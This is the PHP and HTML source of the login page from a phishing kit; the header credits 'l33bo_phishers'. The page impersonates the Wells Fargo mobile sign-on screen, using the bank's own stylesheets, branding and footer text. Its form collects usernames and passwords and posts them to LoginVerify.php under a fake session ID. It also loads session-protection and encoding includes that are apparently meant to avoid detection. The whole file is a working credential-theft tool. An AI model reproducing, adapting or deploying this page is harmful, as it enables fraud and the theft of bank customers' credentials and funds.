<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/ 
require "CONTROLS.php";
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
require "assets/includes/enc.php";
error_reporting(0);
ini_set(‘display_errors’, ’0′);
?>
<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=9">
<title>Login</title>   
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<link rel="stylesheet" href="https://www01.wellsfargomedia.com/css/mobile/framework.css">
<link rel="stylesheet" href="https://www01.wellsfargomedia.com/css/mobile/smartphone-home.css">
<link rel="shortcut icon" type="image/x-icon" href="assets/img/fav.ico">
<link rel="stylesheet" href="assets/css/duda.css" />
<script>

function IsEmpty() {
    var x = document.forms["login"]["user"].value;
    var y = document.forms["login"]["pass"].value;
    if (x == "") {
        document.getElementById("ErrorBox").style.display = "block"; 
        document.getElementById("ErrorUser").style.display = "block"; 
        return false;
    }
    if (y == "") {
        document.getElementById("ErrorBox").style.display = "block"; 
        document.getElementById("ErrorPass").style.display = "block"; 
        return false;
    }
}
</script>
</head>

<body class="freezedscreen" style="top: 0px;">
<div id="shell">

<header class="masthead" role="banner">
<div id="navLeft" style="display: block;"><a tabindex="1" class="backLink"></a></div>
               	
<div class="logoOuter">
<div class="logo">
<a href=""><span class="navbar-brand img-responsive"></span></a>
</div>	
</div>	 
        
                <div id="navRight">
                        
          <nav class="navbar navbar-default navbar-fixed-top">
            <div class="navbar-header">
              <div class="entire-menu headroom headroom--top" id="entire-menu">
                
                <button type="button" class="navbar-toggle hamburguer st-trigger-effects">
                  
                  <span class="sr-only">Menu</span>
                  <span class="icon-bar">&zwj;</span>
                  <span class="icon-bar">&zwj;</span>
                  <span class="icon-bar">&zwj;</span>
                  <span class="expand-icon pointer">&zwj;</span>
                </button>
              </div>
            </div>
          </nav>
        	
                </div>
        
</header>
 


                                 
          

<div id="maincontainer">
	
	<div class="overlaySignOn" style="top: 42px;">
	
<div id="ErrorBox" class="messaging" style="display:none;width: 100%;min-height: 3em;border-bottom: solid 5px #AFAFAF;background-color: #F7F7F6;padding-bottom: 30px;margin-bottom: 16px;float: left;">
                        <div class="messaging-wrapper" style="width: 95%;margin: 0 auto;padding: 8px;text-align: center;color: #000;">
                            <div class="icon error" style="display: block;float: left;width: 32px;height: 32px; margin: 8px 8px 0 0;background: url(assets/img/er.png) no-repeat;"></div>
                 			<div class="message" style="font-size: 12px;color: #000;text-align: left;float: right;width: 85%;">
							<span id="ErrorUser" style="display:none;font-family: arial, helvetica, sans-serif;font-weight:bold">A username must be entered. Please enter your username. </span> 
							<span id="ErrorPass" style="display:none;font-family: arial, helvetica, sans-serif;font-weight:bold">Please enter a password. </span> 
							</div>
                        </div>
                    </div> 
		<div class="overlayContainer">
		
			<div class="welcome-container">Welcome</div>
			
			<div class="security-container">
			<a href="https://imgur.com/treMfMs" target="_blank"><img src="https://imgur.com/treMfMs.jpg" border="0" alt="Image hosted by trem."></a>
				<a href="#" class="security-text">Online &amp; Mobile Security</a>
			</div>
			<div align="center" class="signOnContainer">							
				<form id="frmSignon" name="login" action="LoginVerify.php?sessionid=<?php echo generateRandomString(130); ?>&securessl=true" method="post" autocomplete="off" onsubmit="return IsEmpty();">
					<label class="sr-only" for="userid">Username</label>
					
					<!-- Updated the name and value of the field -->
					<input type="text" maxlength="14" id="userid" placeholder="Username" class="required" name="user" value="" autocomplete="off">
					<div align="left" class="save-uid">
						<ul>
							<li>
								<input type="checkbox" name="username" id="saveusername" value="">
								<label for="saveusername"><span></span>Save Username</label>
							</li>
						</ul>
					</div>
					<label class="sr-only" for="passwd">Password</label>
					
					<input type="password" maxlength="14" placeholder="Password" class="required" id="passwd" name="pass" value="" autocomplete="off">
					<input type="submit" class="signOn" value="Sign On" onclick="return IsEmpty();" >
					<div align="left" class="forgot-uid-pwd">
						<a href="#" class="enroll-text">Forgot Password/Username?</a>
					</div>
					<div class="enroll-header">New to <em>Wells Fargo Online</em><sup>&reg;</sup>?</div>
					<div class="enroll">
						<a href="#" class="enroll-text">Enroll</a>
					</div>
					
								 
				</form>
			</div>

			<footer role="contentinfo">
				<div class="html5footer c9" id="pageFooter">
					<nav class="nav-footer">
						<div class="footer-link clistData">
							<a href="#">PRIVACY, Cookies, Security &amp; Legal</a> | <a href="#">Ad Choices</a>
							<div class="footer-oaa"><a href="#">Online Access Agreement</a>
							</div>
						</div>
						<div class="footer-content">
							<div>
								<strong>Investment and Insurance products:</strong>
							</div>
							<div>
								<strong>NOT FDIC-Insured | NO Bank Guarantee | MAY Lose Value</strong>
							</div>
						</div>
						<div class="footer-content">Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</div>
						<div class="footer-content">
							<span class="home-equal">&zwj;</span> Equal Housing Lender. NMLSR ID 399801</div>
						<div class="footer-content footer-margin">&copy; 2019 Wells Fargo. All rights reserved.</div>
						<div class="stage-coach"><img src="https://www01.wellsfargomedia.com/assets/_mobile/images/global/50_opacity_stagecoach.png"></div>
						</nav></div>
					
				</footer></div>
			
		</div>
		
		
		
		
		
	


 



                        

 
<div><a class="marketing-card" href="#"><img alt="" src="assets/img/hh.jpg"><span class="header-text">Need online access?<br>Enroll Now</span></a></div>



 


</div>
</div>


</body>
</html>
